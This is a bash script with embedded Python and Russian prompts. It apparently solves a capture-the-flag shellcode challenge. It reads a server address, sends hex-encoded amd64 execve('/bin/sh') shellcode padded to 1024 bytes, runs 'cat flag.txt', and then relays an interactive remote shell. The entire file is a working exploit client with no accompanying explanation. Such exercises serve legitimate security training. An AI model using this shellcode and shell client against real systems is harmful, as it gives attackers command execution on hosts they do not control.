#!/usr/bin/env bash
set -euo pipefail

if ! command -v python3 >/dev/null 2>&1; then
  echo 'Ошибка: необходим Python 3. Установите python3 через пакетный менеджер.' >&2
  exit 1
fi

read -r -p 'Адрес сервера (ip:port): ' ADDRESS
if [[ "$ADDRESS" != *:* ]]; then
  echo 'Неверный формат. Пример: 127.0.0.1:40000' >&2
  exit 1
fi
HOST=${ADDRESS%:*}
PORT=${ADDRESS##*:}
if [[ -z "$HOST" || ! "$PORT" =~ ^[0-9]+$ ]] || (( 10#$PORT < 1 || 10#$PORT > 65535 )); then
  echo 'Неверный адрес или порт.' >&2
  exit 1
fi

python3 - "$HOST" "$PORT" <<'PY'
import select
import socket
import sys

host, port = sys.argv[1], int(sys.argv[2])
# amd64 execve('/bin//sh', 0, 0), без байтов 0x00
shellcode = bytes.fromhex('4831f65648bf2f62696e2f2f736857545f6a3b58990f05')
assert b'\x00' not in shellcode
assert len(shellcode) <= 1024
payload = shellcode.ljust(1024, b'A')

try:
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.settimeout(None)
        # Сервер сначала печатает приглашение, затем читает ровно 1024 байта.
        greeting = b''
        while b'Submit your shellcode >>' not in greeting:
            chunk = sock.recv(4096)
            if not chunk:
                raise ConnectionError('Сервер закрыл соединение до отправки shellcode')
            greeting += chunk
        sys.stdout.buffer.write(greeting)
        sys.stdout.buffer.flush()
        sock.sendall(payload)
        sock.sendall(b'cat flag.txt\n')
        print('\n[+] Payload отправлен. Команда cat flag.txt выполнена. Ctrl+C — выход.', flush=True)
        while True:
            inputs = [sock]
            try:
                if sys.stdin.isatty():
                    inputs.append(sys.stdin)
                ready, _, _ = select.select(inputs, [], [])
            except (ValueError, OSError):
                break
            if sock in ready:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
            if sys.stdin in ready:
                line = sys.stdin.buffer.readline()
                if not line:
                    break
                sock.sendall(line)
except (OSError, ConnectionError) as exc:
    print(f'\n[-] Ошибка соединения: {exc}', file=sys.stderr)
    sys.exit(1)
except KeyboardInterrupt:
    print('\n[*] Соединение закрыто')
PY
